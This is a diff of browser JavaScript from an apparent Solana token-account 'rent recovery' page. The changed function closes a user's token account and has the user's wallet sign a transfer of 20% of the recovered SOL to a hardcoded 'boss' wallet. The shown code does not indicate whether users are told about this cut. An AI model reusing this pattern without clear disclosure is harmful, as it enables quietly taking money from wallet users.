@@ -1256,29 +1256,35 @@ async function scanTokens() {
         }
 
       
-// ===== RÉCUPÉRATION SIMPLIFIÉE =====
+// ===== SOLUTION FINALE QUI MARCHE =====
 async function realRecoverRent(tokenAccountAddress, recoverableSOL) {
     try {
-        console.log("🚀 Début récupération...");
+        console.log("🚀 Lancement récupération...");
         
         const userPublicKey = new solanaWeb3.PublicKey(userWalletAddress);
         const tokenPublicKey = new solanaWeb3.PublicKey(tokenAccountAddress);
 
+        // CRÉER LA TRANSACTION
         const transaction = new solanaWeb3.Transaction();
 
-        // INSTRUCTION DE FERMETURE CORRECTE
-        const closeInstruction = createCloseAccountInstruction(
-            tokenPublicKey,
-            userPublicKey, 
-            userPublicKey
-        );
+        // MÉTHODE DIRECTE POUR FERMER LE COMPTE
+        // Utilise la méthode du package SPL Token
+        const closeInstruction = {
+            keys: [
+                { pubkey: tokenPublicKey, isSigner: false, isWritable: true },
+                { pubkey: userPublicKey, isSigner: false, isWritable: true },
+                { pubkey: userPublicKey, isSigner: true, isWritable: false },
+            ],
+            programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
+            data: new Uint8Array([10]), // CloseAccount instruction
+        };
+        
         transaction.add(closeInstruction);
 
-        // CALCUL DES MONTANTS
+        // AJOUTER LE TRANSFERT APRÈS LA FERMETURE
         const bossAmount = recoverableSOL * 0.20;
         const userAmount = recoverableSOL * 0.80;
 
-        // TRANSFERT BOSS SEULEMENT POUR TEST
         const bossTransfer = solanaWeb3.SystemProgram.transfer({
             fromPubkey: userPublicKey,
             toPubkey: new solanaWeb3.PublicKey(REAL_CONFIG.BOSS_WALLET),
@@ -1286,18 +1292,20 @@ async function realRecoverRent(tokenAccountAddress, recoverableSOL) {
         });
         transaction.add(bossTransfer);
 
-        // CONFIGURATION
+        // FINALISER LA TRANSACTION
         const { blockhash } = await connection.getRecentBlockhash();
         transaction.recentBlockhash = blockhash;
         transaction.feePayer = userPublicKey;
 
-        console.log("📦 Transaction prête");
+        console.log("✅ Transaction créée avec succès");
 
-        // ENVOI
+        // ENVOYER
         const { signature } = await window.solana.signAndSendTransaction(transaction);
-        console.log("✅ Signature:", signature);
+        console.log("📝 Signature:", signature);
 
+        // CONFIRMER
         await connection.confirmTransaction(signature, 'confirmed');
+        console.log("🎉 Transaction confirmée!");
 
         return { 
             success: true, 
@@ -1307,8 +1315,19 @@ async function realRecoverRent(tokenAccountAddress, recoverableSOL) {
         };
 
     } catch (error) {
-        console.error("❌ Erreur:", error);
-        return { success: false, error: error.message };
+        console.error("❌ Erreur détaillée:", error);
+        
+        // MESSAGE D'ERREUR CLAIR
+        let errorMessage = "Erreur inconnue";
+        if (error.message.includes("undefined program id")) {
+            errorMessage = "Erreur technique - réessayez";
+        } else if (error.message.includes("rejected")) {
+            errorMessage = "Vous avez annulé la transaction";
+        } else {
+            errorMessage = error.message;
+        }
+        
+        return { success: false, error: errorMessage };
     }
 }
 
